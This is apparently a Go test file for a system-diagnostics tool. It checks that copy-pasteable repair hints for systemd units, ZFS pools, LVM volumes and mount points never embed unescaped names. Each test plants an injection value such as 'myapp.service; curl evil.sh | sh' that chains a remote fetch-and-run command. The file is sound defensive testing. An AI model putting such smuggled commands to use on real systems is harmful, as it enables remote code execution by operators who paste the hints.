package analysis

import (
	"strings"
	"testing"

	"github.com/keyorixhq/dashdiag/internal/models"
)

// This file covers the highest-confidence entries from the shell-hint
// validation audit backlog (dashdiag-private/planning/
// TRIAGE-shell-hint-validation.md) — a follow-up pass to gap C of
// VERIFICATION-2026-08.md, fixing the looksLikeSafeToken idiom for
// systemd unit names, ZFS pool names, LVM VG/LV names, and disk mount
// points. Same threat model as TestCheckKVMVMs_CrashedNameOmitsShellMetachars:
// each of these values is spliced unescaped into a copy-pasteable "to fix:"/
// "to inspect:" shell hint, so a crafted value containing shell
// metacharacters must never appear verbatim in one.

func TestFailedUnitInsight_UnitNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "myapp.service; curl evil.sh | sh"
	ins := failedUnitInsight(unsafe, false, false)
	for _, h := range ins.Hints {
		if strings.Contains(h, "curl evil.sh") {
			t.Errorf("failed-unit hint must not embed the raw shell-metacharacter unit name verbatim (copy-paste RCE risk): %q", h)
		}
	}
}

func TestFailedUnitInsight_SELinuxHintOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "myapp.service; curl evil.sh | sh"
	ins := failedUnitInsight(unsafe, true, false)
	found := false
	for _, h := range ins.Hints {
		if strings.Contains(h, "curl evil.sh") {
			t.Errorf("SELinux ausearch hint must not embed the raw shell-metacharacter unit name verbatim: %q", h)
		}
		if strings.Contains(h, "ausearch") {
			found = true
		}
	}
	if !found {
		t.Error("expected an ausearch hint when selinuxEnforcing is true")
	}
}

func TestCheckZFSPool_NameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "tank; curl evil.sh | sh"
	got := checkZFSPool(models.ZFSPool{
		Name: unsafe, State: "DEGRADED", UsedPct: 50, SizeGB: 100, FreeGB: 50,
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a DEGRADED pool")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("ZFS pool hint must not embed the raw shell-metacharacter pool name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckLVMThinPools_NamesOmitShellMetachars(t *testing.T) {
	t.Parallel()
	unsafeVG := "pve; curl evil.sh | sh"
	unsafePool := "data; curl evil.sh | sh"
	got := checkLVMThinPools([]models.LVMThinPool{{
		Name: unsafePool, VG: unsafeVG, DataPct: 95, MetaPct: 95, SizeGB: 100,
	}})
	if len(got) != 2 {
		t.Fatalf("expected 2 insights (data + metadata exhaustion), got %d", len(got))
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("thin-pool hint must not embed the raw shell-metacharacter VG/pool name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckLVM_VGNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "myvg; curl evil.sh | sh"
	got := checkLVM(models.LVMInfo{
		VGs: []models.LVMVG{{Name: unsafe, HasMountedLV: true, MissingPVs: 1}},
	})
	found := false
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("LVM VG hint must not embed the raw shell-metacharacter VG name verbatim (copy-paste RCE risk): %q", h)
			}
			if strings.Contains(h, "missing PV") || strings.Contains(h, "vgreduce") {
				found = true
			}
		}
	}
	if !found {
		t.Error("expected a missing-PV insight for the VG")
	}
}

func TestCheckLVM_SnapshotNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafeVG := "pve; curl evil.sh | sh"
	unsafeSnap := "snap0; curl evil.sh | sh"
	got := checkLVM(models.LVMInfo{
		Snapshots: []models.LVMSnapshot{{Name: unsafeSnap, VG: unsafeVG, DataPct: 95}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a near-full snapshot")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("LVM snapshot hint must not embed the raw shell-metacharacter VG/snapshot name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckLVMRaid_NamesOmitShellMetachars(t *testing.T) {
	t.Parallel()
	unsafeVG := "pve; curl evil.sh | sh"
	unsafeName := "raidlv; curl evil.sh | sh"
	got := checkLVMRaid(models.LVMInfo{
		RaidLVs: []models.LVMRaidLV{{Name: unsafeName, VG: unsafeVG, Type: "raid1", Degraded: true}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a degraded RAID LV")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("LVM RAID hint must not embed the raw shell-metacharacter VG/LV name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckDisk_MountOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "/mnt/x; curl evil.sh | sh"
	disk := models.DiskInfo{Filesystems: []models.FilesystemInfo{{
		Mount: unsafe, Device: "/dev/sda1", FSType: "ext4", UsedPct: 95, InodesUsedPct: 95,
	}}}
	got := checkDisk(disk, defaultThresh)
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a near-full filesystem")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("disk-usage hint must not embed the raw shell-metacharacter mount point verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckDisk_ReadOnlyRemountMountOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "/mnt/x; curl evil.sh | sh"
	disk := models.DiskInfo{Filesystems: []models.FilesystemInfo{{
		Mount: unsafe, Device: "/dev/sda1", FSType: "ext4", ReadOnly: true,
	}}}
	got := checkDisk(disk, defaultThresh)
	found := false
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("read-only-remount hint must not embed the raw shell-metacharacter mount point verbatim (copy-paste RCE risk): %q", h)
			}
			if strings.Contains(h, "remount,rw") {
				found = true
			}
		}
	}
	if !found {
		t.Error("expected a read-only-remount insight with a remount hint")
	}
}
